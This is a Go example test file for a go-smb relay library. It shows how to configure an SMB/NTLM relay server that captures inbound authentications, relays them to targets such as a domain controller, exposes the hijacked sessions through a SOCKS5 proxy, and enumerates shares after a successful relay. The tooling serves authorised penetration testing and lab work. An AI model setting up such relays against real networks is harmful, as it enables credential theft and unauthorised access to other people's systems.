// MIT License
//
// Copyright (c) 2026 Jimmy Fjällid

package relay_test

import (
	"context"
	"fmt"
	"time"

	"github.com/jfjallid/go-smb/relay"
	"github.com/jfjallid/go-smb/smb"
)

// ExampleRelayServer shows the minimum configuration: one SMB target, an
// SMB inbound listener on the default port, and an OnCapture hook that
// receives one finalized record per inbound auth — no separate
// OnCredentialCaptured/OnRelaySuccess correlation needed.
//
// Bind to ":0" (or pass -listen) for tests/labs to avoid the privileged
// port :445.
func ExampleRelayServer() {
	rs := &relay.RelayServer{
		Config: relay.ServerConfig{
			Targets:    []string{"smb://10.0.0.5"},
			ListenAddr: ":0",
			OnCapture: func(c relay.CapturedAuth) {
				fmt.Printf("captured %s\\%s status=%s\n", c.Domain, c.Username, c.Status)
			},
		},
	}
	if err := rs.Start(); err != nil {
		// In a real program: handle the error; we just exit the example.
		return
	}
	defer func() {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		_ = rs.Shutdown(ctx)
	}()

	// In a real workflow you'd block here (signal handler, REPL) while
	// captures stream in. Example exits immediately.
}

// ExampleRelayServer_socks demonstrates exposing the captured pool through
// a local SOCKS5 proxy. Tools that dial through 127.0.0.1:1080 piggyback
// the corresponding pooled SMB/HTTP/LDAP session.
func ExampleRelayServer_socks() {
	rs := &relay.RelayServer{
		Config: relay.ServerConfig{
			Targets:    []string{"smb://dc01"},
			ListenAddr: ":0",
			SocksAddr:  "127.0.0.1:0",
		},
	}
	_ = rs.Start
	_ = rs.Shutdown
}

// ExampleRelayServer_postAuth runs an EnumShares action against each
// upstream session immediately after a successful relay.
func ExampleRelayServer_postAuth() {
	rs := &relay.RelayServer{
		Config: relay.ServerConfig{
			Targets:    []string{"smb://dc01"},
			ListenAddr: ":0",
			PostAuthActions: []relay.PostAuthAction{
				relay.EnumSharesAction{},
			},
			OnRelaySuccess: func(target string, _ *smb.Connection, cred *relay.Credential) {
				fmt.Println("relayed to", target, "as", cred.Username)
			},
		},
	}
	_ = rs
}
